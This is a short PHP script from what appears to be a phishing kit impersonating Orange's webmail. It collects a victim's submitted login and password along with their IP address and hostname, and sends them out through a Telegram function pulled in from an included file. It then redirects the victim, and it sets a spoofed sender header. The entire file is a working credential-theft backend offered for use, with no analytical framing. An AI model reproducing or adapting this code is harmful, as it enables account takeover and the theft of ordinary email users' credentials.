<?php
include'fun.php';
$login = $_POST['login'];
$pass = $_POST['pass'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "♦♦|OrangeMail|♦♦\n";
$message.= "Login: " . $login . "\n";
$message.= "Password: " . $pass . "\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
       
$subject = "ORANGE MAIL Account - $ip " .   "\n";
$headers = "From: <goggle.comm>";

telegram_send(urlencode($message));
header("Location: fin.php");
//header("Location: https://espace-client.orange.fr/page-accueil");

        
?>

